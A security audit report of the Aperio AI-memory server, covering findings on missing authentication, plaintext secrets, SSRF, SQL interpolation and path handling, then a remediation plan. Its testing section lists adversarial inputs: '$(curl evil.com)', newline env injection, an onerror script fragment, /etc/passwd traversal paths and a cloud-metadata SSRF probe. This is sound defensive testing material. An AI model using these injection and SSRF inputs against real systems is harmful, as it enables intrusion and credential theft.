# Aperio Security Evaluation

> **Audit date:** 2026-06-11
> **Scope:** Full codebase audit — server.js, MCP tools, database layer, session management, configuration, dependencies, Docker deployment.
> **Auditor:** Security Engineer (automated review via CodeWhale deepseek-v4-pro)

---

## Executive Summary

Aperio is a self-hosted personal memory layer for AI agents. It runs as a local Express + WebSocket server with an MCP (Model Context Protocol) subprocess. The application is designed for single-user local use, which means several security properties one would expect from a multi-user web service are absent by design. However, several findings are actionable even within the "local-first" threat model, and some patterns would become high-risk if the application were ever exposed to a network or used in a multi-user context.

**Risk tiers used in this report:**

| Tier | Label | Meaning |
|------|-------|---------|
| **A** | Critical | Immediate risk of data exfiltration, remote code execution, or credential theft — fix now |
| **B** | High | Significant weakness that compounds with other issues or network exposure |
| **C** | Medium | Defense-in-depth gap; hardening recommended |
| **D** | Low | Informational / best-practice deviation |

---

## Findings

### AUTH-01 — No Authentication or Authorization (Tier: B)

**Files:** `server.js:57`, `lib/routes/api.js:32`, `mcp/index.js:53`

The entire HTTP API, WebSocket endpoint, and MCP server operate with **zero authentication**. Anyone who can reach the listening port has unrestricted access to:

- Read/write all memories (`GET/POST /api/memories`)
- View and delete session histories (`GET/DELETE /api/sessions`)
- Browse the database (`GET /api/db/tables`, `GET /api/db/table/:name`)
- Execute shell commands and Node/Python scripts (when shell is enabled)
- Read/write files within allowed paths
- Change the AI provider and provider configuration at runtime
- Access all API keys loaded into the process

The WebSocket server (`server.js:488-498`) performs a hostname origin check, but this only prevents basic cross-origin WebSocket attacks from a browser — it is **not authentication**. The MCP server (Stdio transport) has no authentication at all.

**Mitigation context:** Aperio defaults to binding `127.0.0.1` (loopback). The README warns against binding to `0.0.0.0`. This is a reasonable mitigation for a single-user local tool. However, the Docker production compose file (`docker-compose.prod.yml`) maps port `3000` to the host without any authentication layer, and the Dockerfile sets `HOST=0.0.0.0`.

**Recommendation:**
- For the local-use case, keep the loopback default and add a startup-time banner warning when bound to non-loopback.
- For any deployment beyond localhost, add at minimum an API key or shared secret header check on all non-static routes.
- Add an opt-in `APERIO_AUTH_TOKEN` environment variable that gates all API and WS access.

---

### SECRET-01 — API Keys Stored in Plain Text on Disk (Tier: A)

**Files:** `lib/helpers/envFile.js:41-80`, `.env.example`

The setup wizard (`POST /api/setup/config`) writes the user's API key directly to `.env` in plain text. Anyone with filesystem access to the Aperio directory can read:

- Anthropic API key
- DeepSeek API key
- Gemini API key
- Voyage API key
- GitHub personal access token
- Postgres password

The `.env` file is excluded from git via `.gitignore` (`*.env`), which is good. However, there is no filesystem-level encryption, no OS keychain integration, and no mechanism to detect if the file has been tampered with.

**Recommendation:**
- Integrate with the OS keychain (macOS Keychain, freedesktop Secret Service, Windows Credential Manager) via the `keytar` package or similar.
- Fall back to a local encrypted store (e.g., AES-256-GCM with a machine-derived key) when keychain is unavailable.
- If plain `.env` must remain the fallback, add a prominent warning in the setup wizard and set restrictive file permissions (`0600`).
- Implement a `/api/config/validate-secrets` endpoint that checks whether stored credentials are still valid without exposing them.

---

### SECRET-02 — Default Postgres Credentials Hardcoded (Tier: B)

**Files:** `.env.example:62-65`, `docker/docker-compose.yml`

The `.env.example` file ships with:

```
POSTGRES_PASSWORD=aperio_secret      # change this!
DATABASE_URL=postgresql://aperio:aperio_secret@localhost:5432/aperio
```

The `docker-compose.yml` uses `${POSTGRES_PASSWORD:?Set POSTGRES_PASSWORD in your .env file}`, which enforces that the variable is set. But the `docker-compose.prod.yml` falls back to `${POSTGRES_PASSWORD}` without the `:?` guard. If `.env.example` is copied to `.env` without modification, the Postgres instance runs with a well-known password.

**Recommendation:**
- Replace `aperio_secret` with a randomly generated password during first-run wizard. Write it to `.env` during setup.
- Add the `:?` guard to all compose files.
- Add a startup check: if `POSTGRES_PASSWORD === "aperio_secret"`, log a warning and refuse to start in production mode.

---

### SSRF-01 — Server-Side Request Forgery via fetch_url (Tier: B)

**Files:** `mcp/tools/web.js:11-42`

The `fetch_url` tool fetches any URL the model requests. There is no restriction on internal/loopback addresses. A malicious or compromised model could:

- Probe internal services at `http://localhost:*`, `http://127.0.0.1:*`, `http://[::1]:*`
- Access cloud metadata endpoints (e.g., `http://169.254.169.254/latest/meta-data/` on AWS)
- Scan the local network via private IP ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)

**Files:** `mcp/tools/github.js:41-52` — The `fetchImageAsBase64` helper also fetches arbitrary URLs from GitHub issue content without SSRF protection.

**Recommendation:**
- Add an SSRF guard that resolves the hostname before fetching and rejects:
  - Loopback addresses: `127.0.0.0/8`, `::1`
  - Link-local: `169.254.0.0/16`
  - Private ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
  - The Docker internal bridge (`172.17.0.0/16`)
- Provide an opt-out flag `APERIO_ALLOW_INTERNAL_FETCH=1` for power users.
- Apply the same guard to `fetchImageAsBase64` in github.js.

---

### SSRF-02 — Image Description Tool Fetches Arbitrary URLs (Tier: B)

**Files:** `mcp/tools/image.js:264-280` (describeImageHandler)

The `describe_image` tool can accept a `url` parameter and fetches it for VLM processing. Same SSRF exposure as `fetch_url`, with the added risk that the fetched content is loaded into an image decoder pipeline (sharp), which has its own attack surface for crafted image files.

**Recommendation:**
- Apply the same SSRF guard described in SSRF-01.
- Validate that the fetched content-type is actually an image before passing to sharp.

---

### INJECTION-01 — SQL Injection via Table Name Interpolation (Tier: C)

**Files:** `db/sqlite.js:465`, `db/postgres.js:197`

Both database backends use string interpolation for table names in `readTable()` and `listTables()`:

```js
// sqlite.js:465
const stmt = this.db.prepare(`SELECT * FROM ${name}${where}`);

// postgres.js:197
const { rows, fields } = await this.pool.query(`SELECT * FROM ${name}${where}`);
```

The `name` parameter is validated against `DB_TABLES` via `isAllowedTable()` before reaching these sites. This is a defense-in-depth concern — the whitelist is effective today, but a future refactor that bypasses the check could introduce SQL injection.

**Recommendation:**
- Map table names to a hardcoded lookup in a single function rather than concatenating into SQL.
- Add a simple regex guard: reject any table name that contains non-alphanumeric characters or underscores.
- Add a test that asserts no table-name SQL string in the codebase contains `${name}` without an adjacent whitelist check on the same call path.

---

### INJECTION-02 — FTS5 Query Injection in SQLite (Tier: C)

**Files:** `db/sqlite.js:568-570`

The SQLite FTS5 search builds `IN` clauses via string interpolation of user-supplied tags:

```js
WHERE je.value IN (${tags.map((_, i) => `@t${i}`).join(', ')})
```

This is **parameterized** via named parameters (`@t0`, `@t1`, etc.), so the tag values themselves are safe. But the structural SQL is built from the number of tags, which is controlled by caller input.

**Recommendation:**
- This pattern is well-defended today. Add a comment noting the rationale so future maintainers don't refactor it into an unsafe form.
- Cap the maximum number of tags to prevent resource exhaustion from absurdly large `IN` clauses.

---

### INJECTION-03 — FTS Query Interpolation in Postgres (Tier: C)

**Files:** `db/postgres.js:266`

```js
AND search_vector @@ plainto_tsquery('${lang}', $2)
```

The `lang` variable is interpolated into the SQL string. `lang` comes from a lookup against `LOCALE_TO_PG_CONFIG`, which maps to fixed strings like `'english'`, `'german'`, etc. This is currently safe because the lookup limits the values, but the interpolation pattern is fragile.

**Recommendation:**
- Use `pg-format` or a similar safe formatter, or map known configs to a hardcoded switch.
- Add a test that fails if `LOCALE_TO_PG_CONFIG` is extended without corresponding SQL safety.

---

### INJECTION-04 — envFile.js Escapes Incomplete (Tier: C)

**Files:** `lib/helpers/envFile.js:33-39`

The `setKey` function in `envFile.js` has basic quoting logic:

```js
const safe = /[\s#"'$]/.test(value) ? `"${value.replace(/"/g, '\\"')}"` : value;
```

This handles double-quote escaping but does not escape:
- Backslash characters (`\`)
- Newline injection (a value like `foo\nEVIL_KEY=evil` would append a new key)
- Dollar signs in unquoted values (Bash would expand them)

The input comes from the setup wizard API endpoint, so an attacker would need to be on localhost or have network access to reach the API. Still, the generated `.env` should be robust.

**Recommendation:**
- Always quote values unconditionally, and escape backslash as well as double-quote.
- Strip newlines from values before writing.
- Add a validation test for the `writeEnvFromWizard` function with adversarial inputs.

---

### NET-01 — No HTTPS / TLS Support (Tier: B)

**Files:** `server.js:57`, `docker/Dockerfile`

The server listens on plain HTTP only. API keys, session tokens, memory contents, and tool results are all transmitted in cleartext. In the default loopback-only configuration this has limited exposure (local processes on the same machine), but:

- The Docker production setup binds to `0.0.0.0` with no TLS termination.
- The public-facing `PORT` environment variable enables exposing the server on a LAN without TLS.
- Browser clients connected over HTTP have no integrity guarantees.

**Recommendation:**
- Document that users should place Aperio behind a reverse proxy (nginx, Caddy) with TLS for any network exposure.
- Add built-in TLS support via `https.createServer` when `APERIO_TLS_CERT` and `APERIO_TLS_KEY` are set.
- Generate a self-signed certificate on first run for local HTTPS, with a clear browser warning bypass path.

---

### NET-02 — No Security Headers (Tier: D)

**Files:** `server.js` (entire Express app)

The Express application sets no security-related HTTP headers:

| Missing Header | Risk |
|----------------|------|
| `Content-Security-Policy` | XSS from dynamic content |
| `X-Content-Type-Options: nosniff` | MIME type sniffing |
| `X-Frame-Options: DENY` | Clickjacking |
| `Strict-Transport-Security` | Downgrade attacks (when TLS is added) |
| `Referrer-Policy` | Information leakage via Referer |

**Recommendation:**
- Add the `helmet` npm package (lightweight, no breaking changes) and apply its defaults.
- Set `Content-Security-Policy` to restrict script sources to `'self'` and `'unsafe-inline'` (the current frontend uses inline scripts).

---

### NET-03 — No Rate Limiting (Tier: C)

**Files:** `lib/routes/api.js`, `server.js`

No endpoint has rate limiting. An attacker on the same machine or network could:

- Flood the `/api/memories/import` endpoint with 500-row batches to exhaust memory.
- Repeatedly call `/api/setup/config` to rewrite `.env`.
- Hammer the embedding generation pipeline.
- Exhaust CPU via `/api/wiki/search` or `/api/codegraph/search`.

**Recommendation:**
- Add `express-rate-limit` middleware to sensitive endpoints: setup config, memory import, embedding generation, codegraph indexing.
- Add a global rate limiter as a catch-all.
- Use a different window for AI-model-calling endpoints vs. DB-only endpoints.

---

### DOS-01 — File Size / Upload Limits Inconsistent (Tier: C)

**Files:** `server.js:58`, `lib/routes/api.js:72,115,202,603`

The Express JSON body parser is configured with a 1MB global limit:

```js
app.use(express.json({ limit: '1mb' }));
```

Individual routes override this:
- `/api/provider` → `4kb`
- `/api/paths` → `16kb`
- `/api/memories/import` → `512kb`
- `/api/settings/:key` → `64kb`

But:
- The global limit of 1MB applies to all routes without explicit overrides.
- There is no multipart upload size limit for the attachment upload path (handled via WebSocket).
- The `read_image` tool caps at 20MB per image but there's no aggregate limit on how many images can be described in a single turn.

**Recommendation:**
- Add `express.urlencoded({ limit: '16kb' })` for form data.
- Set a maximum number of attachments per WebSocket message.
- Cap the total turn payload (text + attachments) at a sensible limit (e.g., 25MB).
- Set the global JSON limit to 256kb and only raise it on routes that need more.

---

### PATH-01 — Path Traversal via Tilde Expansion (Tier: C)

**Files:** `mcp/tools/files.js:87`, `mcp/tools/image.js:60,119`

Several file-operation tools handle `~` expansion manually:

```js
const resolved = filePath.replace(/^~/, process.cwd());  // files.js:87
const resolved = filePath.startsWith("~") ? filePath.replace("~", process.cwd()) : filePath;  // image.js:60
```

The first form (`replace(/^~/, process.cwd())`) incorrectly expands `~user` paths — it replaces only the leading `~` without checking if it's followed by a `/` or end-of-string. The second form (`startsWith("~")`) has the same issue plus it doesn't anchor to the start of the string.

A path like `~otheruser/.ssh/id_rsa` would be resolved as `<cwd>otheruser/.ssh/id_rsa`, which is wrong but not a traversal. However, a path like `~/../../../etc/passwd` would resolve to `<cwd>/../../../etc/passwd`, which could escape the allowed path if the cwd is under an allowed root.

The `isReadPathAllowed` / `isWritePathAllowed` guards catch the traversal at the final resolved path since they call `realpathSafe(resolve(...))`. The sequence is:

1. `~` expansion → incorrect for multi-user tilde
2. `resolve()` → resolves `..` segments
3. `realpathSafe()` → resolves symlinks
4. `isUnder()` → checks against allowlist

So the path traversal is caught at step 3-4. But the `~` expansion is still incorrect and inconsistent.

**Recommendation:**
- Use `os.homedir()` for `~` expansion consistently (as paths.js:49 already does).
- Add `~username` expansion or explicitly reject it.
- Add a unit test for tilde expansion edge cases.

---

### PATH-02 — Static File Serving of Sensitive Directories (Tier: C)

**Files:** `server.js:136-137`

```js
app.use("/uploads", express.static(resolve(__dirname, "var/uploads")));
app.use("/scratch", express.static(resolve(__dirname, "var/scratch")));
```

User-uploaded files and session scratch outputs are served as static files without any authentication. Anyone on localhost can enumerate files in these directories if they know or guess paths. Scratch directories are session-specific (`var/scratch/<uuid>/`), but the UUID is transmitted in the WebSocket handshake and stored in session JSON files.

**Recommendation:**
- Add a middleware that checks a session token (cookie or header) before serving files from `/uploads` and `/scratch`.
- Alternatively, serve uploads through a proxy API endpoint that validates the requesting session.
- Set `index: false` on these static mounts (as done for the main public mount).

---

### SESSION-01 — Session Files Contain Full Message History in Plain Text (Tier: C)

**Files:** `lib/helpers/sessions.js:52-55`

Session data is persisted as JSON files in `var/sessions/<id>.json`. These files contain the complete message history including any sensitive information the user or model exchanged. The files are stored on disk with default permissions (typically `0644` or inherited from the process umask).

**Recommendation:**
- Set file permissions to `0600` when writing session files.
- Add an `APERIO_ENCRYPT_SESSIONS` option that encrypts session files at rest with a machine-derived key.
- Ensure `var/sessions/` is excluded from any backup scripts that might sync to cloud storage.

---

### BOOTSTRAP-01 — Curl-Pipe-Shell Installation (Tier: C)

**Files:** `bootstrap.js:75-79,88-91`

The bootstrap process downloads and executes shell scripts from the internet:

```js
await runSilently('sh', ['-c',
  'curl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | sh'
]);
// ...
await runSilently('sh', ['-c',
  `curl -fsSL https://ollama.com/install.sh -o /tmp/ollama_install.sh && \
   chmod +x /tmp/ollama_install.sh && \
   /tmp/ollama_install.sh`
]);
```

The Ollama installer is written to `/tmp` first, which is better than the pipe-to-shell pattern. The nvm installer uses the more dangerous pipe-to-shell pattern (`curl ... | sh`).

**Recommendation:**
- Pin the nvm installer to a specific SHA256 hash and verify before executing.
- Use the write-to-then-execute pattern consistently.
- Document that users should inspect these bootstrap steps if running in a sensitive environment.

---

### DEP-01 — CORS Package in Lockfile but Not in Dependencies (Tier: D)

The `cors` package (v2.8.6) appears in `package-lock.json` but not in `package.json`. It is a transitive dependency of the MCP SDK (`@modelcontextprotocol/sdk`). Aperio itself does not use CORS middleware. This is not a vulnerability but indicates that the `package-lock.json` may have accumulated unused transitive dependencies.

---

### DEP-02 — No Dependency Vulnerability Scanning (Tier: C)

The codebase has no `npm audit`, Dependabot configuration, or SCA (Software Composition Analysis) in CI. The `package.json` scripts include:
```
"npm install --prefer-offline --no-audit --no-fund"
```
The `--no-audit` flag explicitly skips vulnerability auditing during install.

The GitHub CI workflows include CodeQL and SonarQube, but these focus on code-level static analysis, not dependency vulnerabilities.

**Recommendation:**
- Remove `--no-audit` from the bootstrap install command.
- Add `npm audit --production` to CI.
- Enable Dependabot alerts and PRs (the repo has a Dependabot badge suggesting it's enabled, but verify).
- Add `socket.dev` or `supply-chain` GitHub Action for supply-chain risk analysis.

---

### LOG-01 — Sensitive Data in Error Messages (Tier: D)

**Files:** Throughout the codebase

Error messages from tool failures, database operations, and API responses are logged and returned to the client without scrubbing. While error messages don't typically contain secrets, stack traces and database error details could leak schema information or API endpoint details.

**Recommendation:**
- Add a production error handler that returns generic messages to the client while logging full details server-side.
- Do not include raw `err.message` in API responses in production mode unless the error is explicitly user-facing.

---

### PROC-01 — Uncaught Exception Handler Doesn't Exit (Tier: D)

**Files:** `server.js:20-25`

```js
process.on("uncaughtException", (err) => {
  logger.error("Uncaught exception:", err);
});
process.on("unhandledRejection", (err) => {
  logger.error("Unhandled rejection:", err);
});
```

These handlers log and continue. Node.js documentation warns that the process may be in an undefined state after an uncaught exception. The intent (prevent crash from a single bad connection) is reasonable, but a genuinely corrupted state could lead to data loss or silent misbehavior.

**Recommendation:**
- Keep the handlers for WebSocket-level errors, but add a circuit breaker: if uncaught exceptions exceed a threshold within a time window, perform a graceful restart.
- Use `domain` or `AsyncLocalStorage` to scope error handling to individual connections rather than process-wide.

---

## Security Architecture Diagram

```
┌──────────────────────────────────────────────────────────┐
│                    Browser / CLI Client                    │
│              (connects via HTTP / WebSocket)               │
└──────────┬───────────────────────────────┬────────────────┘
           │                               │
           │ HTTP (Express, port 3000)      │ WS (ws, upgrade)
           │ ❌ No TLS                      │ ✅ Hostname check
           │ ❌ No auth                     │ ❌ No auth
           │ ❌ No CORS config              │ ❌ No rate limiting
           │ ❌ No rate limiting            │
           ▼                               ▼
┌──────────────────────┐        ┌──────────────────────────┐
│   Express Routes      │        │   WebSocket Handler       │
│   /api/* endpoints    │        │   wsHandler.js            │
│   ❌ Missing CSP      │        │   ✅ Per-connection state │
│   ❌ No input size    │        │   ✅ Path allowlist       │
│      limits on some   │        └───────────┬──────────────┘
└──────────┬───────────┘                     │
           │                                 │
           ▼                                 ▼
┌──────────────────────────────────────────────────────────┐
│                     MCP Subprocess (stdio)                │
│  ┌─────────┐ ┌──────────┐ ┌───────┐ ┌──────┐ ┌───────┐  │
│  │ files   │ │  shell   │ │  web  │ │image │ │ github│  │
│  │ ✅ path │ │✅ allow- │ │❌ SSRF│ │❌SSRF│ │✅ token│  │
│  │ guard   │ │ list     │ │       │ │      │ │ guard  │  │
│  └─────────┘ └──────────┘ └───────┘ └──────┘ └───────┘  │
└──────────────────────┬───────────────────────────────────┘
                       │
           ┌───────────┴───────────┐
           ▼                       ▼
    ┌────────────┐         ┌──────────────┐
    │  SQLite    │         │   Postgres    │
    │  ✅ WAL    │         │   (Docker)    │
    │  ✅ FKs    │         │   ❌ Plain .env│
    │  ❌ ${name}│         │   ❌ ${name}   │
    │  ❌ 0644   │         │   ❌ Default pw│
    └────────────┘         └──────────────┘
```

---

## Remediation Roadmap

The findings are prioritised by risk and implementation cost. Each phase can be tackled independently.

### Phase 1 — Quick Wins (1-2 days)

These fixes address the highest-impact issues with minimal architectural change:

| ID | Action | Effort |
|----|--------|--------|
| SECRET-01 | Set `.env` file permissions to `0600` on write | 1 line |
| SECRET-01 | Strip newlines and escape backslash in envFile.js values | ~5 lines |
| SECRET-02 | Generate random Postgres password on first run | ~20 lines |
| SECRET-02 | Add `:?` guard to docker-compose.prod.yml | 1 line |
| SSRF-01 | Add SSRF guard to fetch_url / fetchImageAsBase64 | ~40 lines |
| NET-02 | Add `helmet` middleware for security headers | 1 line + dep |
| NET-01 | Document reverse-proxy TLS setup in README | documentation |
| INJECTION-01 | Add regex guard on table names + test | ~10 lines |
| PATH-01 | Fix `~` expansion to use `os.homedir()` | ~5 lines |
| DOS-01 | Add global JSON body limit of 256kb | 1 line |

### Phase 2 — Hardening (3-5 days)

These add defense-in-depth without changing the local-first architecture:

| ID | Action | Effort |
|----|--------|--------|
| AUTH-01 | Add `APERIO_AUTH_TOKEN` opt-in authentication middleware | ~30 lines |
| AUTH-01 | Apply auth to all `/api/*` routes and WS `verifyClient` | ~20 lines |
| SESSION-01 | Set `0600` permissions on session files | 1 line |
| DEP-02 | Add `npm audit --production` to CI | CI config |
| DEP-02 | Remove `--no-audit` from bootstrap | 1 line |
| NET-03 | Add `express-rate-limit` on sensitive endpoints | ~30 lines |
| PATH-02 | Add session-based auth middleware for `/uploads` and `/scratch` | ~30 lines |
| LOG-01 | Add production error handler with scrubbed client messages | ~20 lines |
| BOOTSTRAP-01 | Pin nvm installer to SHA256 hash | ~5 lines |
| LOG-01 | Log error messages in tests with `NODE_ENV=test` | existing |

### Phase 3 — Deep Defense (1-2 weeks)

These are architectural improvements for multi-user or network-exposed deployments:

| ID | Action | Effort |
|----|--------|--------|
| SECRET-01 | Integrate OS keychain for API key storage | ~100 lines + dep |
| NET-01 | Add built-in TLS via `https.createServer` with env vars | ~30 lines |
| AUTH-01 | Add per-session token generation and validation | ~80 lines |
| SESSION-01 | Add at-rest encryption option for session files | ~60 lines |
| INJECTION-01 | Refactor table-name lookups to a single hardcoded map | ~20 lines |
| DEP-02 | Add Dependabot / supply-chain scanning to CI | CI config |
| DOS-01 | Add aggregate per-turn payload limit for WebSocket | ~15 lines |

---

## How to Test Components for Vulnerabilities

### Testing Authentication (AUTH-01)

```bash
# Test that API routes reject unauthenticated requests when token is set
APERIO_AUTH_TOKEN=test-secret npm start &
curl -s http://localhost:3000/api/memories | jq '.error'  # should return "unauthorized"
curl -s -H "Authorization: Bearer test-secret" http://localhost:3000/api/memories | jq '.raw'  # should succeed
kill %1
```

### Testing SSRF Protection (SSRF-01, SSRF-02)

```bash
# These should be rejected by the SSRF guard
# Use the MCP CLI or the describe_image tool via WebSocket
echo '{"type":"chat","text":"fetch http://169.254.169.254/latest/meta-data/"}' | websocat ws://localhost:3000
# Expected: tool call is rejected or returns SSRF blocked message
```

### Testing SQL Injection (INJECTION-01, INJECTION-02)

```bash
# Run the DB browser tests that exercise the table-name whitelist
NODE_ENV=test node --test tests/db/
# Add a test case that tries a malicious table name
```

### Testing Input Validation (INJECTION-04)

```bash
# Test envFile.js with adversarial inputs
NODE_ENV=test node --test tests/lib/helpers/
# Add test cases:
# - value = 'foo\nEVIL=bar'
# - value = 'test" onerror="alert(1)'
# - value = '$(curl evil.com)'
```

### Testing Rate Limiting (NET-03)

```bash
# After adding rate limiting:
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" http://localhost:3000/api/memories
done
# Should see 429 responses after the rate limit kicks in
```

### Testing Path Traversal (PATH-01, PATH-02)

```bash
# Run the files tool tests
NODE_ENV=test node --test tests/mcp/tools/files.test.js
# Add test cases:
# - '~otheruser/file.txt'
# - '~/../../../etc/passwd'
# - '../../../etc/passwd'
```

### Testing File Permissions (SECRET-01, SESSION-01)

```bash
# After writing .env, check permissions
ls -la .env        # should be -rw-------
ls -la var/sessions/*.json  # should be -rw-------
```

---

## Continuous Security Monitoring

1. **Pre-commit hook**: Add a `.husky/pre-commit` hook that runs `npm audit --production` and blocks commits with critical/high vulnerabilities.

2. **CI pipeline**: Add these gates to CI:
   - `npm audit --production --audit-level=moderate`
   - `npm run test:ci` (existing, with coverage)
   - CodeQL (already in CI)
   - A custom lint rule that flags `process.env.*_API_KEY` or `process.env.*_TOKEN` appearing in log statements or error messages.

3. **Periodic review checklist** (quarterly):
   - [ ] Review `npm audit` output, update dependencies
   - [ ] Verify `.env` is in `.gitignore` and `.dockerignore`
   - [ ] Check that no secrets are logged in `var/logs/`
   - [ ] Review any new `express.static` mounts for path traversal
   - [ ] Review any new `spawn()` / `exec()` calls for command injection
   - [ ] Review any new `fetch()` calls for SSRF
   - [ ] Run the full test suite with coverage

4. **Security contacts**: If a vulnerability is found in Aperio, it should be reported per the `SECURITY.md` file at the repo root.

---

*End of security evaluation. This document should be reviewed and updated with each major release.*
